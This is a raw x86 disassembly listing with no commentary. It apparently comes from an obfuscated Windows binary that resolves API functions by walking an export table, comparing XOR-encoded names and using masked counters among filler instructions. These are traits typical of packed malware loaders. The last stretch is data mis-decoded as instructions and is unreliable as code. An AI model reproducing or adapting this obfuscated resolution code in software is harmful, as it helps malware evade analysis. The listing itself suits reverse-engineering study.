  4219a3:	mov    ecx,DWORD PTR [ebp+0x8]
  4219a6:	lea    eax,[ecx+eax*1-0x1f534807]
  4219ad:	mov    ecx,DWORD PTR [ebp-0xf0]
  4219b3:	and    ecx,0x4108
  4219b9:	and    ecx,0x40e7
  4219bf:	sub    ecx,0x1a54
  4219c5:	xor    ecx,0x25ac
  4219cb:	mov    edx,DWORD PTR [ebp-0x104]
  4219d1:	xor    edx,0x6dda
  4219d7:	mov    esi,DWORD PTR [ebp-0x108]
  4219dd:	and    edx,esi
  4219df:	and    edx,0xe0c
  4219e5:	or     edx,0x5b
  4219e8:	mov    esi,DWORD PTR [ebp-0xe8]
  4219ee:	mov    ecx,DWORD PTR [esi+ecx*1+0x1c]
  4219f2:	add    ecx,eax
  4219f4:	lea    eax,[edx+ecx*1-0xc5b]
  4219fb:	mov    DWORD PTR [ebp-0xa8],eax
  421a01:	and    DWORD PTR [ebp-0x144],0x0
  421a08:	jmp    0x421a1a
  421a0d:	mov    eax,DWORD PTR [ebp-0x144]
  421a13:	inc    eax
  421a14:	mov    DWORD PTR [ebp-0x144],eax
  421a1a:	mov    eax,DWORD PTR [ebp-0xe8]
  421a20:	mov    ecx,DWORD PTR [ebp-0x144]
  421a26:	cmp    ecx,DWORD PTR [eax+0x18]
  421a29:	je     0x421fe2
  421a2f:	mov    eax,DWORD PTR [ebp-0x144]
  421a35:	mov    ecx,DWORD PTR [ebp-0x38]
  421a38:	mov    edx,DWORD PTR [ebp+0x8]
  421a3b:	add    edx,DWORD PTR [ecx+eax*4]
  421a3e:	mov    DWORD PTR [ebp-0x48],edx
  421a41:	mov    eax,DWORD PTR [ebp-0x48]
  421a44:	mov    DWORD PTR [ebp-0x210],eax
  421a4a:	mov    eax,DWORD PTR [ebp+0xc]
  421a4d:	mov    DWORD PTR [ebp-0x20c],eax
  421a53:	mov    DWORD PTR [ebp-0x1f0],0xca79a575
  421a5d:	mov    DWORD PTR [ebp-0x1ec],0x9c1b89e8
  421a67:	mov    DWORD PTR [ebp-0x1e0],0xca79a571
  421a71:	mov    DWORD PTR [ebp-0x1dc],0x9c1b89e8
  421a7b:	lea    eax,[ebp-0x1e8]
  421a81:	mov    DWORD PTR [ebp-0x1f4],eax
  421a87:	mov    eax,DWORD PTR [ebp-0x20c]
  421a8d:	movzx  eax,WORD PTR [eax+0x20]
  421a91:	xor    eax,0xa49b
  421a96:	movzx  eax,ax
  421a99:	sar    eax,1
  421a9b:	mov    ecx,DWORD PTR [ebp-0x20c]
  421aa1:	movzx  ecx,WORD PTR [ecx+0x20]
  421aa5:	xor    ecx,0xa49b
  421aab:	movzx  ecx,cx
  421aae:	shl    ecx,0xf
  421ab1:	or     eax,ecx
  421ab3:	movzx  eax,ax
  421ab6:	mov    ecx,DWORD PTR [ebp-0x1f4]
  421abc:	mov    DWORD PTR [ecx],eax
  421abe:	mov    eax,DWORD PTR [ebp-0x1e0]
  421ac4:	mov    edx,DWORD PTR [ebp-0x1dc]
  421aca:	xor    eax,0xca79a575
  421acf:	xor    edx,0x9c1b89e8
  421ad5:	mov    cl,0x2
  421ad7:	call   0x40a9b5
  421adc:	mov    ebx,eax
  421ade:	mov    esi,edx
  421ae0:	mov    eax,DWORD PTR [ebp-0x1e0]
  421ae6:	mov    edx,DWORD PTR [ebp-0x1dc]
  421aec:	xor    eax,0xca79a575
  421af1:	xor    edx,0x9c1b89e8
  421af7:	mov    cl,0x3e
  421af9:	call   0x422276
  421afe:	or     ebx,eax
  421b00:	or     esi,edx
  421b02:	movzx  eax,bl
  421b05:	push   eax
  421b06:	lea    eax,[ebp-0x198]
  421b0c:	push   eax
  421b0d:	call   0x416c9e
  421b12:	mov    eax,DWORD PTR [ebp-0x1f0]
  421b18:	mov    edx,DWORD PTR [ebp-0x1ec]
  421b1e:	xor    eax,0xca79a575
  421b23:	xor    edx,0x9c1b89e8
  421b29:	mov    cl,0x2
  421b2b:	call   0x40a9b5
  421b30:	mov    esi,eax
  421b32:	mov    edi,edx
  421b34:	mov    eax,DWORD PTR [ebp-0x1f0]
  421b3a:	mov    edx,DWORD PTR [ebp-0x1ec]
  421b40:	xor    eax,0xca79a575
  421b45:	xor    edx,0x9c1b89e8
  421b4b:	mov    cl,0x3e
  421b4d:	call   0x422276
  421b52:	or     esi,eax
  421b54:	or     edi,edx
  421b56:	mov    DWORD PTR [ebp-0x1f8],esi
  421b5c:	jmp    0x421bb1
  421b61:	mov    eax,DWORD PTR [ebp-0x1e0]
  421b67:	mov    edx,DWORD PTR [ebp-0x1dc]
  421b6d:	xor    eax,0xca79a575
  421b72:	xor    edx,0x9c1b89e8
  421b78:	mov    cl,0x2
  421b7a:	call   0x40a9b5
  421b7f:	mov    esi,eax
  421b81:	mov    edi,edx
  421b83:	mov    eax,DWORD PTR [ebp-0x1e0]
  421b89:	mov    edx,DWORD PTR [ebp-0x1dc]
  421b8f:	xor    eax,0xca79a575
  421b94:	xor    edx,0x9c1b89e8
  421b9a:	mov    cl,0x3e
  421b9c:	call   0x422276
  421ba1:	or     esi,eax
  421ba3:	or     edi,edx
  421ba5:	add    esi,DWORD PTR [ebp-0x1f8]
  421bab:	mov    DWORD PTR [ebp-0x1f8],esi
  421bb1:	mov    eax,DWORD PTR [ebp-0x1e8]
  421bb7:	cmp    DWORD PTR [ebp-0x1f8],eax
  421bbd:	je     0x421c50
  421bc3:	mov    eax,DWORD PTR [ebp-0x1f8]
  421bc9:	mov    ecx,DWORD PTR [ebp-0x20c]
  421bcf:	movzx  eax,WORD PTR [ecx+eax*4+0x2]
  421bd4:	xor    eax,0xa49b
  421bd9:	movzx  eax,ax
  421bdc:	sar    eax,1
  421bde:	mov    ecx,DWORD PTR [ebp-0x1f8]
  421be4:	mov    edx,DWORD PTR [ebp-0x20c]
  421bea:	movzx  ecx,WORD PTR [edx+ecx*4+0x2]
  421bef:	xor    ecx,0xa49b
  421bf5:	movzx  ecx,cx
  421bf8:	shl    ecx,0xf
  421bfb:	or     eax,ecx
  421bfd:	movzx  eax,ax
  421c00:	mov    DWORD PTR [ebp-0x1fc],eax
  421c06:	mov    eax,DWORD PTR [ebp-0x1f8]
  421c0c:	mov    ecx,DWORD PTR [ebp-0x20c]
  421c12:	movzx  eax,WORD PTR [ecx+eax*4]
  421c16:	xor    eax,0xa49b
  421c1b:	movzx  eax,ax
  421c1e:	sar    eax,1
  421c20:	mov    ecx,DWORD PTR [ebp-0x1f8]
  421c26:	mov    edx,DWORD PTR [ebp-0x20c]
  421c2c:	movzx  ecx,WORD PTR [edx+ecx*4]
  421c30:	xor    ecx,0xa49b
  421c36:	movzx  ecx,cx
  421c39:	shl    ecx,0xf
  421c3c:	or     eax,ecx
  421c3e:	mov    ecx,DWORD PTR [ebp-0x1fc]
  421c44:	mov    BYTE PTR [ebp+ecx*1-0x198],al
  421c4b:	jmp    0x421b61
  421c50:	mov    eax,DWORD PTR [ebp-0x1f0]
  421c56:	mov    edx,DWORD PTR [ebp-0x1ec]
  421c5c:	xor    eax,0xca79a575
  421c61:	xor    edx,0x9c1b89e8
  421c67:	mov    cl,0x2
  421c69:	call   0x40a9b5
  421c6e:	mov    esi,eax
  421c70:	mov    edi,edx
  421c72:	mov    eax,DWORD PTR [ebp-0x1f0]
  421c78:	mov    edx,DWORD PTR [ebp-0x1ec]
  421c7e:	xor    eax,0xca79a575
  421c83:	xor    edx,0x9c1b89e8
  421c89:	mov    cl,0x3e
  421c8b:	call   0x422276
  421c90:	or     esi,eax
  421c92:	or     edi,edx
  421c94:	mov    DWORD PTR [ebp-0x1e4],esi
  421c9a:	mov    eax,DWORD PTR [ebp-0x1e0]
  421ca0:	mov    edx,DWORD PTR [ebp-0x1dc]
  421ca6:	xor    eax,0xca79a575
  421cab:	xor    edx,0x9c1b89e8
  421cb1:	mov    cl,0x2
  421cb3:	call   0x40a9b5
  421cb8:	mov    esi,eax
  421cba:	mov    edi,edx
  421cbc:	mov    eax,DWORD PTR [ebp-0x1e0]
  421cc2:	mov    edx,DWORD PTR [ebp-0x1dc]
  421cc8:	xor    eax,0xca79a575
  421ccd:	xor    edx,0x9c1b89e8
  421cd3:	mov    cl,0x3e
  421cd5:	call   0x422276
  421cda:	or     esi,eax
  421cdc:	or     edi,edx
  421cde:	mov    DWORD PTR [ebp-0x23c],esi
  421ce4:	mov    DWORD PTR [ebp-0x238],edi
  421cea:	mov    eax,DWORD PTR [ebp-0x23c]
  421cf0:	or     eax,DWORD PTR [ebp-0x238]
  421cf6:	je     0x421f56
  421cfc:	lea    eax,[ebp-0x204]
  421d02:	mov    DWORD PTR [ebp-0x208],eax
  421d08:	mov    eax,DWORD PTR [ebp-0x1e4]
  421d0e:	xor    edx,edx
  421d10:	mov    cl,0x2
  421d12:	call   0x422276
  421d17:	mov    esi,eax
  421d19:	mov    edi,edx
  421d1b:	mov    eax,DWORD PTR [ebp-0x1e4]
  421d21:	xor    edx,edx
  421d23:	mov    cl,0x3e
  421d25:	call   0x40a9b5
  421d2a:	or     esi,eax
  421d2c:	or     edi,edx
  421d2e:	xor    esi,0xca79a575
  421d34:	xor    edi,0x9c1b89e8
  421d3a:	mov    eax,DWORD PTR [ebp-0x208]
  421d40:	mov    DWORD PTR [eax],esi
  421d42:	mov    DWORD PTR [eax+0x4],edi
  421d45:	mov    eax,DWORD PTR [ebp-0x1e4]
  421d4b:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  421d53:	mov    eax,DWORD PTR [ebp-0x1e0]
  421d59:	mov    edx,DWORD PTR [ebp-0x1dc]
  421d5f:	xor    eax,0xca79a575
  421d64:	xor    edx,0x9c1b89e8
  421d6a:	mov    cl,0x2
  421d6c:	call   0x40a9b5
  421d71:	mov    ebx,eax
  421d73:	mov    edi,edx
  421d75:	mov    eax,DWORD PTR [ebp-0x1e0]
  421d7b:	mov    edx,DWORD PTR [ebp-0x1dc]
  421d81:	xor    eax,0xca79a575
  421d86:	xor    edx,0x9c1b89e8
  421d8c:	mov    cl,0x3e
  421d8e:	call   0x422276
  421d93:	or     ebx,eax
  421d95:	or     edi,edx
  421d97:	movsx  eax,bl
  421d9a:	cmp    esi,eax
  421d9c:	je     0x421efc
  421da2:	mov    eax,DWORD PTR [ebp-0x1e4]
  421da8:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  421db0:	mov    eax,DWORD PTR [ebp-0x204]
  421db6:	mov    edx,DWORD PTR [ebp-0x200]
  421dbc:	xor    eax,0xca79a575
  421dc1:	xor    edx,0x9c1b89e8
  421dc7:	mov    cl,0x2
  421dc9:	call   0x40a9b5
  421dce:	mov    edi,eax
  421dd0:	mov    ebx,edx
  421dd2:	mov    eax,DWORD PTR [ebp-0x204]
  421dd8:	mov    edx,DWORD PTR [ebp-0x200]
  421dde:	xor    eax,0xca79a575
  421de3:	xor    edx,0x9c1b89e8
  421de9:	mov    cl,0x3e
  421deb:	call   0x422276
  421df0:	or     edi,eax
  421df2:	or     ebx,edx
  421df4:	mov    eax,DWORD PTR [ebp-0x210]
  421dfa:	movsx  eax,BYTE PTR [eax+edi*1]
  421dfe:	cmp    esi,eax
  421e00:	je     0x421e10
  421e06:	jmp    0x421f56
  421e0b:	jmp    0x421efc
  421e10:	mov    eax,DWORD PTR [ebp-0x204]
  421e16:	mov    edx,DWORD PTR [ebp-0x200]
  421e1c:	xor    eax,0xca79a575
  421e21:	xor    edx,0x9c1b89e8
  421e27:	mov    cl,0x2
  421e29:	call   0x40a9b5
  421e2e:	mov    esi,eax
  421e30:	mov    edi,edx
  421e32:	mov    eax,DWORD PTR [ebp-0x204]
  421e38:	mov    edx,DWORD PTR [ebp-0x200]
  421e3e:	xor    eax,0xca79a575
  421e43:	xor    edx,0x9c1b89e8
  421e49:	mov    cl,0x3e
  421e4b:	call   0x422276
  421e50:	or     esi,eax
  421e52:	or     edi,edx
  421e54:	mov    eax,DWORD PTR [ebp-0x210]
  421e5a:	movsx  esi,BYTE PTR [eax+esi*1]
  421e5e:	mov    eax,DWORD PTR [ebp-0x1f0]
  421e64:	mov    edx,DWORD PTR [ebp-0x1ec]
  421e6a:	xor    eax,0xca79a575
  421e6f:	xor    edx,0x9c1b89e8
  421e75:	mov    cl,0x2
  421e77:	call   0x40a9b5
  421e7c:	mov    ebx,eax
  421e7e:	mov    edi,edx
  421e80:	mov    eax,DWORD PTR [ebp-0x1f0]
  421e86:	mov    edx,DWORD PTR [ebp-0x1ec]
  421e8c:	xor    eax,0xca79a575
  421e91:	xor    edx,0x9c1b89e8
  421e97:	mov    cl,0x3e
  421e99:	call   0x422276
  421e9e:	or     ebx,eax
  421ea0:	or     edi,edx
  421ea2:	movsx  eax,bl
  421ea5:	cmp    esi,eax
  421ea7:	jne    0x421efc
  421ead:	mov    eax,DWORD PTR [ebp-0x1e0]
  421eb3:	mov    edx,DWORD PTR [ebp-0x1dc]
  421eb9:	xor    eax,0xca79a575
  421ebe:	xor    edx,0x9c1b89e8
  421ec4:	mov    cl,0x2
  421ec6:	call   0x40a9b5
  421ecb:	mov    esi,eax
  421ecd:	mov    edi,edx
  421ecf:	mov    eax,DWORD PTR [ebp-0x1e0]
  421ed5:	mov    edx,DWORD PTR [ebp-0x1dc]
  421edb:	xor    eax,0xca79a575
  421ee0:	xor    edx,0x9c1b89e8
  421ee6:	mov    cl,0x3e
  421ee8:	call   0x422276
  421eed:	or     esi,eax
  421eef:	or     edi,edx
  421ef1:	mov    DWORD PTR [ebp-0x214],esi
  421ef7:	jmp    0x421fa0
  421efc:	mov    eax,DWORD PTR [ebp-0x1e0]
  421f02:	mov    edx,DWORD PTR [ebp-0x1dc]
  421f08:	xor    eax,0xca79a575
  421f0d:	xor    edx,0x9c1b89e8
  421f13:	mov    cl,0x2
  421f15:	call   0x40a9b5
  421f1a:	mov    esi,eax
  421f1c:	mov    edi,edx
  421f1e:	mov    eax,DWORD PTR [ebp-0x1e0]
  421f24:	mov    edx,DWORD PTR [ebp-0x1dc]
  421f2a:	xor    eax,0xca79a575
  421f2f:	xor    edx,0x9c1b89e8
  421f35:	mov    cl,0x3e
  421f37:	call   0x422276
  421f3c:	or     esi,eax
  421f3e:	or     edi,edx
  421f40:	add    esi,DWORD PTR [ebp-0x1e4]
  421f46:	mov    DWORD PTR [ebp-0x1e4],esi
  421f4c:	jmp    0x421c9a
  421f51:	jmp    0x421c9a
  421f56:	mov    eax,DWORD PTR [ebp-0x1f0]
  421f5c:	mov    edx,DWORD PTR [ebp-0x1ec]
  421f62:	xor    eax,0xca79a575
  421f67:	xor    edx,0x9c1b89e8
  421f6d:	mov    cl,0x2
  421f6f:	call   0x40a9b5
  421f74:	mov    esi,eax
  421f76:	mov    edi,edx
  421f78:	mov    eax,DWORD PTR [ebp-0x1f0]
  421f7e:	mov    edx,DWORD PTR [ebp-0x1ec]
  421f84:	xor    eax,0xca79a575
  421f89:	xor    edx,0x9c1b89e8
  421f8f:	mov    cl,0x3e
  421f91:	call   0x422276
  421f96:	or     esi,eax
  421f98:	or     edi,edx
  421f9a:	mov    DWORD PTR [ebp-0x214],esi
  421fa0:	mov    eax,DWORD PTR [ebp-0x214]
  421fa6:	mov    DWORD PTR [ebp-0xc8],eax
  421fac:	cmp    DWORD PTR [ebp-0xc8],0x0
  421fb3:	je     0x421fdd
  421fb9:	mov    eax,DWORD PTR [ebp-0x144]
  421fbf:	mov    ecx,DWORD PTR [ebp-0xac]
  421fc5:	movzx  eax,WORD PTR [ecx+eax*2]
  421fc9:	mov    ecx,DWORD PTR [ebp-0xa8]
  421fcf:	mov    eax,DWORD PTR [ecx+eax*4]
  421fd2:	mov    DWORD PTR [ebp-0xfc],eax
  421fd8:	jmp    0x421fe2
  421fdd:	jmp    0x421a0d
  421fe2:	cmp    DWORD PTR [ebp-0xfc],0x0
  421fe9:	jne    0x421ff6
  421fef:	xor    eax,eax
  421ff1:	jmp    0x42226f
  421ff6:	mov    eax,DWORD PTR [ebp+0x8]
  421ff9:	add    eax,DWORD PTR [ebp-0xfc]
  421fff:	mov    DWORD PTR [ebp-0xec],eax
  422005:	mov    DWORD PTR [ebp-0x74],0x0
  42200c:	cmp    DWORD PTR [ebp-0xb0],0x0
  422013:	je     0x42208f
  422019:	cmp    DWORD PTR [ebp-0xb0],0x0
  422020:	je     0x42208f
  422026:	mov    eax,DWORD PTR [ebp-0xb0]
  42202c:	shl    eax,0x2
  42202f:	mov    DWORD PTR [ebp-0x74],eax
  422032:	mov    DWORD PTR [ebp-0x14c],0x0
  42203c:	sub    esp,DWORD PTR [ebp-0x74]
  42203f:	mov    DWORD PTR [ebp-0x14c],esp
  422045:	mov    DWORD PTR [ebp-0x148],0x0
  42204f:	mov    eax,DWORD PTR [ebp-0x148]
  422055:	cmp    eax,DWORD PTR [ebp-0xb0]
  42205b:	je     0x42208f
  422061:	mov    eax,DWORD PTR [ebp-0x148]
  422067:	mov    ecx,DWORD PTR [ebp-0x14c]
  42206d:	mov    edx,DWORD PTR [ebp-0x148]
  422073:	mov    esi,DWORD PTR [ebp+0x14]
  422076:	mov    edx,DWORD PTR [esi+edx*4+0x4]
  42207a:	mov    DWORD PTR [ecx+eax*4],edx
  42207d:	mov    eax,DWORD PTR [ebp-0x148]
  422083:	inc    eax
  422084:	mov    DWORD PTR [ebp-0x148],eax
  42208a:	jmp    0x42204f
  42208f:	mov    DWORD PTR [ebp-0x9c],0x0
  422099:	push   0x422228
  42209e:	jmp    DWORD PTR [ebp-0xec]
  4220a4:	mov    eax,eax
  4220a6:	mov    ecx,esp
  4220a8:	ret    0xc
  4220ab:	cmp    DWORD PTR ds:0x42833f,0x0
  4220b2:	mov    DWORD PTR ds:0x42833b,0x7476
  4220bc:	mov    DWORD PTR ds:0x4281b7,0x1cdc
  4220c6:	mov    DWORD PTR ds:0x42833b,0x65fa
  4220d0:	mov    DWORD PTR ds:0x4281a7,0x5dca
  4220da:	jmp    0x422124
  4220df:	mov    eax,ds:0x428337
  4220e4:	cmp    DWORD PTR ds:0x42833f,0x0
  4220eb:	jbe    0x42210c
  4220f1:	push   0x24f1
  4220f6:	call   DWORD PTR ds:0x428db8
  4220fc:	inc    DWORD PTR ds:0x4283e3
  422102:	sub    DWORD PTR ds:0x4281c3,0x46d9
  42210c:	inc    DWORD PTR ds:0x42833f
  422112:	adc    DWORD PTR ds:0x42834b,ebx
  422118:	or     DWORD PTR ds:0x428273,0x4029
  422122:	not    eax
  422124:	push   ebx
  422125:	push   esi
  422126:	sbb    DWORD PTR ds:0x4283cf,edx
  42212c:	mov    eax,DWORD PTR [esp+0x18]
  422130:	or     eax,eax
  422132:	jne    0x422162
  422138:	mov    ecx,DWORD PTR [esp+0x14]
  42213c:	mov    eax,DWORD PTR [esp+0x10]
  422140:	xor    edx,edx
  422142:	div    ecx
  422144:	xor    DWORD PTR ds:0x4281cf,0x45f1
  42214e:	mov    ebx,eax
  422150:	mov    eax,DWORD PTR [esp+0xc]
  422154:	div    ecx
  422156:	mov    edx,0x36e3
  42215b:	mov    edx,ebx
  42215d:	jmp    0x422223
  422162:	mov    ecx,eax
  422164:	sbb    eax,0x67a9
  422169:	mov    ebx,DWORD PTR [esp+0x14]
  42216d:	cmp    DWORD PTR ds:0x428337,0x0
  422174:	mov    edx,DWORD PTR ds:0x4283e7
  42217a:	mov    DWORD PTR ds:0x428367,0x4bc7
  422184:	mov    edx,DWORD PTR ds:0x42834f
  42218a:	jmp    0x4221d4
  42218f:	mov    DWORD PTR ds:0x428297,0x15f
  422199:	mov    DWORD PTR ds:0x4282cf,0x4dd1
  4221a3:	cmp    DWORD PTR ds:0x428337,0x0
  4221aa:	jle    0x4221c7
  4221b0:	push   0x824e
  4221b5:	call   DWORD PTR ds:0x428dbc
  4221bb:	xor    DWORD PTR ds:0x42834f,0x6c44
  4221c5:	sub    edx,edx
  4221c7:	sbb    DWORD PTR ds:0x428297,0x445e
  4221d1:	dec    edx
  4221d2:	not    edx
  4221d4:	mov    edx,DWORD PTR [esp+0x10]
  4221d8:	mov    eax,DWORD PTR [esp+0xc]
  4221dc:	shr    ecx,1
  4221de:	rcr    ebx,1
  4221e0:	shr    edx,1
  4221e2:	rcr    eax,1
  4221e4:	or     ecx,ecx
  4221e6:	jne    0x4221dc
  4221ec:	div    ebx
  4221ee:	mov    esi,eax
  4221f0:	mul    DWORD PTR [esp+0x18]
  4221f4:	mov    ecx,eax
  4221f6:	mov    eax,DWORD PTR [esp+0x14]
  4221fa:	mul    esi
  4221fc:	add    edx,ecx
  4221fe:	jb     0x42221e
  422204:	cmp    edx,DWORD PTR [esp+0x10]
  422208:	ja     0x42221e
  42220e:	jb     0x42221f
  422214:	cmp    eax,DWORD PTR [esp+0xc]
  422218:	jbe    0x42221f
  42221e:	dec    esi
  42221f:	xor    edx,edx
  422221:	mov    eax,esi
  422223:	pop    esi
  422224:	pop    ebx
  422225:	ret    0x10
  422228:	or     DWORD PTR ds:0x4283b3,0x4283bf
  422232:	sub    DWORD PTR [ebp+0x10],0x1
  422236:	mov    DWORD PTR ds:0x4281bb,0x43bf
  422240:	cmp    DWORD PTR [ebp+0x10],0x0
  422244:	mov    DWORD PTR ds:0x4283ab,0x612a
  42224e:	je     0x42225d
  422254:	xor    DWORD PTR ds:0x4281a7,edx
  42225a:	add    esp,DWORD PTR [ebp-0x74]
  42225d:	mov    DWORD PTR [ebp-0x9c],eax
  422263:	mov    DWORD PTR ds:0x4282af,ebx
  422269:	mov    eax,DWORD PTR [ebp-0x9c]
  42226f:	pop    edi
  422270:	pop    esi
  422271:	pop    ebx
  422272:	leave  
  422273:	ret    0x10
  422276:	cmp    cl,0x40
  422279:	mov    DWORD PTR ds:0x428293,0x43a8
  422283:	jae    0x4222d5
  422289:	mov    DWORD PTR ds:0x4281c7,0x42f2
  422293:	cmp    cl,0x20
  422296:	mov    DWORD PTR ds:0x4281af,0x3d58
  4222a0:	jae    0x4222c0
  4222a6:	or     DWORD PTR ds:0x4281a3,0x5e1e
  4222b0:	shld   edx,eax,cl
  4222b3:	mov    DWORD PTR ds:0x4282c7,0x1bd2
  4222bd:	shl    eax,cl
  4222bf:	ret    
  4222c0:	inc    edx
  4222c1:	mov    edx,eax
  4222c3:	sub    DWORD PTR ds:0x4283e3,0x42833b
  4222cd:	xor    eax,eax
  4222cf:	and    cl,0x1f
  4222d2:	shl    edx,cl
  4222d4:	ret    
  4222d5:	xor    eax,eax
  4222d7:	xor    edx,edx
  4222d9:	ret    
  4222da:	add    BYTE PTR [eax],al
  4222dc:	add    BYTE PTR [eax],al
  4222de:	add    BYTE PTR [eax],al
  4222e0:	jmp    0x3c568e20
  4222e5:	es sub al,0x44
  4222e8:	jno    0x422353
  4222ea:	ja     0x422351
  4222ec:	int3   
  4222ed:	fsubr  QWORD PTR [edx+0x1e]
  4222f0:	jo     0x422357
  4222f2:	popa   
  4222f3:	ins    BYTE PTR es:[edi],dx
  4222f4:	push   eax
  4222f5:	lods   eax,DWORD PTR ds:[esi]
  4222f6:	xor    DWORD PTR [esi+0x41],edi
  4222f9:	ins    BYTE PTR es:[edi],dx
  4222fa:	popa   
  4222fb:	outs   dx,BYTE PTR ds:[esi]
  4222fc:	add    BYTE PTR [eax],al
  4222fe:	add    BYTE PTR [eax],al
  422300:	addr16 jb 0x422368
  422303:	popa   
  422304:	je     0x42236d
  422306:	jb     0x42236d
  422308:	popa   
  422309:	je     0x422372
  42230b:	jb     0x422372
  42230d:	popa   
  42230e:	je     0x422377
  422310:	jb     0x422377
  422312:	popa   
  422313:	je     0x42237c
  422315:	jb     0x42237c
  422317:	popa   
  422318:	je     0x422381
  42231a:	jb     0x422381
  42231c:	popa   
  42231d:	je     0x422386
  42231f:	jb     0x422386
  422321:	popa   
  422322:	je     0x42238b
  422324:	jb     0x42238b
  422326:	popa   
  422327:	je     0x422390
  422329:	jb     0x422390
  42232b:	popa   
  42232c:	je     0x422395
  42232e:	jb     0x422395
  422330:	popa   
  422331:	je     0x422333
  422333:	add    BYTE PTR [eax+0x65],ch
  422336:	ins    BYTE PTR es:[edi],dx
  422337:	ins    BYTE PTR es:[edi],dx
  422338:	push   0x686c6c65
  42233d:	gs ins BYTE PTR es:[edi],dx
  42233f:	ins    BYTE PTR es:[edi],dx
  422340:	push   0x686c6c65
  422345:	gs ins BYTE PTR es:[edi],dx
  422347:	ins    BYTE PTR es:[edi],dx
  422348:	push   0x686c6c65
  42234d:	gs ins BYTE PTR es:[edi],dx
  42234f:	ins    BYTE PTR es:[edi],dx
  422350:	push   0x686c6c65
  422355:	gs ins BYTE PTR es:[edi],dx
  422357:	ins    BYTE PTR es:[edi],dx
  422358:	push   0x686c6c65
  42235d:	gs ins BYTE PTR es:[edi],dx
  42235f:	ins    BYTE PTR es:[edi],dx
  422360:	push   0x686c6c65
  422365:	gs ins BYTE PTR es:[edi],dx
  422367:	ins    BYTE PTR es:[edi],dx
  422368:	add    BYTE PTR [eax],al
  42236a:	add    BYTE PTR [eax],al
  42236c:	outs   dx,DWORD PTR ds:[esi]
  42236d:	add    BYTE PTR [eax+eax*1+0x65],ch
  422371:	add    BYTE PTR [ecx+0x0],ah
  422374:	jne    0x422376
  422376:	je     0x422378
  422378:	xor    eax,DWORD PTR [eax]
  42237a:	xor    al,BYTE PTR [eax]
  42237c:	add    BYTE PTR [eax],al
  42237e:	add    BYTE PTR [eax],al
  422380:	push   0x61006500
  422385:	add    BYTE PTR [esi+0x0],dh
  422388:	add    BYTE PTR gs:[esi+0x0],ch
  42238c:	push   0x61006500
  422391:	add    BYTE PTR [esi+0x0],dh
  422394:	add    BYTE PTR gs:[esi+0x0],ch
  422398:	push   0x61006500
  42239d:	add    BYTE PTR [esi+0x0],dh
  4223a0:	add    BYTE PTR gs:[esi+0x0],ch
  4223a4:	push   0x61006500
  4223a9:	add    BYTE PTR [esi+0x0],dh
  4223ac:	add    BYTE PTR gs:[esi+0x0],ch
  4223b0:	push   0x61006500
  4223b5:	add    BYTE PTR [esi+0x0],dh
  4223b8:	add    BYTE PTR gs:[esi+0x0],ch
  4223bc:	push   0x61006500
  4223c1:	add    BYTE PTR [esi+0x0],dh
  4223c4:	add    BYTE PTR gs:[esi+0x0],ch
  4223c8:	push   0x61006500
  4223cd:	add    BYTE PTR [esi+0x0],dh
  4223d0:	add    BYTE PTR gs:[esi+0x0],ch
  4223d4:	push   0x61006500
  4223d9:	add    BYTE PTR [esi+0x0],dh
  4223dc:	add    BYTE PTR gs:[esi+0x0],ch
  4223e0:	push   0x61006500
  4223e5:	add    BYTE PTR [esi+0x0],dh
  4223e8:	add    BYTE PTR gs:[esi+0x0],ch
  4223ec:	add    BYTE PTR [eax],al
  4223ee:	add    BYTE PTR [eax],al
  4223f0:	ins    BYTE PTR es:[edi],dx
  4223f1:	and    eax,DWORD PTR [edx+0x0]
  4223f4:	dec    edi
  4223f5:	ins    BYTE PTR es:[edi],dx
  4223f6:	gs dec ecx
  4223f8:	arpl   WORD PTR [edi+0x6e],bp
  4223fb:	push   esp
  4223fc:	outs   dx,DWORD PTR ds:[esi]
  4223fd:	inc    ebx
  4223fe:	jne    0x422472
  422400:	jae    0x422471
  422402:	jb     0x422404
  422404:	hlt    
  422405:	and    eax,DWORD PTR [edx+0x0]
	...
  422410:	mov    al,0x27
  422412:	inc    edx
  422413:	add    BYTE PTR [eax+0x70004227],bh
  422419:	es inc edx
  42241b:	add    dl,dh
  42241d:	inc    ebx
  42241e:	push   ebx
  42241f:	mov    WORD PTR ds:0x1a49ba4,ss
  422425:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422426:	popf   
  422427:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422428:	jno    0x4223ce
  42242a:	xchg   edi,eax
  42242b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42242c:	or     esp,DWORD PTR [ecx+ecx*4-0x7c5bac5c]
  422433:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422434:	sbb    DWORD PTR [ebp+eax*4-0x445b645c],esp
  42243b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42243c:	rol    DWORD PTR [edx-0x5b6a732f],cl
  422442:	adc    eax,0x1a49ba4
  422447:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422448:	popf   
  422449:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42244a:	jno    0x4223f0
  42244c:	xchg   edi,eax
  42244d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42244e:	or     esp,DWORD PTR [ecx+ecx*4-0x7c5bac5c]
  422455:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422456:	xor    eax,0x9ba485a4
  42245b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42245c:	mov    ebx,0xd1e2d3a4
  422461:	in     al,dx
  422462:	xchg   ebp,eax
  422463:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422464:	adc    eax,0x3ba49ba4
  422469:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42246a:	popf   
  42246b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42246c:	sbb    DWORD PTR [ebp+edx*4-0x705b805c],esp
  422473:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422474:	fwait
  422475:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422476:	xchg   DWORD PTR [ebx+edx*8-0xe332e3e],esp
  42247d:	sub    al,0xf7
  42247f:	cs pop ss
  422481:	push   cs
  422482:	adc    eax,0x3a49108
  422487:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422488:	fwait
  422489:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42248a:	add    esp,DWORD PTR [ebx+edx*4-0x6a5b805c]
